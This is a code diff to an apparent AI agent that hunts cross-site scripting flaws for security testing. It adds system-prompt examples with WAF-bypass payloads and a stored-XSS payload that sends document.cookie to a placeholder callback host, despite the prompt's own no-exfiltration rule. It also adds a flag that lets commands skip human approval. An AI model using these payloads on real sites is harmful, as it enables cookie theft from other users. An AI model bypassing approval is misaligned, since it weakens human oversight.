@@ -24,6 +24,7 @@ import type {
   ReactFinding,
 } from '../core/engine/react_loop';
 import { AGENT_TOOL_SCHEMAS } from '../core/engine/tool_schemas';
+import type { HttpClient } from '../core/http/request_engine';
 
 const XSS_SYSTEM_PROMPT = `You are an expert Cross-Site Scripting (XSS) security researcher with deep knowledge of browser rendering engines, DOM APIs, Content Security Policy, and WAF bypass techniques. You specialize in finding reflected, stored, DOM-based, and blind XSS vulnerabilities in web applications.
 
@@ -91,7 +92,41 @@ IMPORTANT RULES:
 - Use appropriate delays between requests to avoid overwhelming targets
 - Never exfiltrate real user data — use proof-of-concept payloads only (alert, console.log, interactsh callbacks)
 - Document every finding with full reproduction steps
-- Report the injection context and any bypasses required`;
+- Report the injection context and any bypasses required
+
+## Examples of Successful XSS Discoveries
+
+### Example 1: Reflected XSS with WAF Bypass
+**Step 1 — Identify reflection:**
+Tool call: http_request { url: "https://[redacted].com/search?q=huntress123test", method: "GET" }
+Response: 200 OK — body contains "Results for: huntress123test" — input reflected in HTML context
+
+**Step 2 — Test basic payload (likely blocked):**
+Tool call: http_request { url: "https://[redacted].com/search?q=<script>alert(1)</script>", method: "GET" }
+Response: 403 Forbidden — WAF blocked the request
+
+**Step 3 — Bypass WAF with event handler:**
+Tool call: http_request { url: "https://[redacted].com/search?q=<img src=x onerror=alert(document.domain)>", method: "GET" }
+Response: 403 — also blocked
+
+**Step 4 — Use encoding bypass:**
+Tool call: http_request { url: "https://[redacted].com/search?q=<svg/onload=alert(document.domain)>", method: "GET" }
+Response: 200 OK — body contains the SVG tag unescaped — XSS fires!
+
+**Step 5 — Report:**
+Tool call: report_finding { title: "Reflected XSS in /search 'q' parameter via SVG onload WAF bypass", severity: "high", vulnerability_type: "xss_reflected", confidence: 95 }
+
+### Example 2: Automated XSS Discovery with Dalfox
+**Step 1 — Run dalfox scanner:**
+Tool call: execute_command { command: "dalfox url 'https://[redacted].com/profile?name=test&bio=test' --format json --skip-bav", target: "[redacted].com", category: "scanning" }
+Result: Found 2 verified XSS — "name" param (reflected), "bio" param (stored in profile page)
+
+**Step 2 — Validate stored XSS manually:**
+Tool call: http_request { url: "https://[redacted].com/profile?bio=<img src=x onerror=fetch('https://OAST_URL/'+document.cookie)>", method: "GET" }
+Response: 200 OK — payload stored in profile, fires when other users view the profile
+
+**Step 3 — Report:**
+Tool call: report_finding { title: "Stored XSS in user profile 'bio' field — fires on profile view by any user", severity: "high", vulnerability_type: "xss_stored", confidence: 92 }`;
 
 export class XssHunterAgent implements BaseAgent {
   readonly metadata: AgentMetadata = {
@@ -107,6 +142,7 @@ export class XssHunterAgent implements BaseAgent {
   private model?: string;
   private findings: AgentFinding[] = [];
   private status: AgentStatus;
+  private autoApproveSafe = false;
   private onApprovalRequest?: (req: { command: string; target: string; reasoning: string; category: string; toolName: string; safetyWarnings: string[] }) => Promise<boolean>;
   private onExecuteCommand?: (command: string, target: string) => Promise<CommandResult>;
 
@@ -125,9 +161,13 @@ export class XssHunterAgent implements BaseAgent {
   setCallbacks(callbacks: {
     onApprovalRequest?: (req: { command: string; target: string; reasoning: string; category: string; toolName: string; safetyWarnings: string[] }) => Promise<boolean>;
     onExecuteCommand?: (command: string, target: string) => Promise<CommandResult>;
+    autoApproveSafe?: boolean;
   }): void {
     this.onApprovalRequest = callbacks.onApprovalRequest;
     this.onExecuteCommand = callbacks.onExecuteCommand;
+    if (callbacks.autoApproveSafe !== undefined) {
+      this.autoApproveSafe = callbacks.autoApproveSafe;
+    }
   }
 
   async initialize(provider: ModelProvider, model: string): Promise<void> {
@@ -156,7 +196,7 @@ export class XssHunterAgent implements BaseAgent {
         maxIterations: 30,
         target: task.target,
         scope: task.scope,
-        autoApproveSafe: false,
+        autoApproveSafe: this.autoApproveSafe,
         onApprovalRequest: this.onApprovalRequest,
         onExecuteCommand: this.onExecuteCommand,
         onFinding: (finding) => {
@@ -167,6 +207,8 @@ export class XssHunterAgent implements BaseAgent {
           this.status.toolsExecuted = update.toolCallCount;
           this.status.lastUpdate = Date.now();
         },
+        httpClient: task.parameters.httpClient as HttpClient | undefined,
+        availableTools: task.parameters.availableTools as string[] | undefined,
       });
 
       const result = await loop.execute();
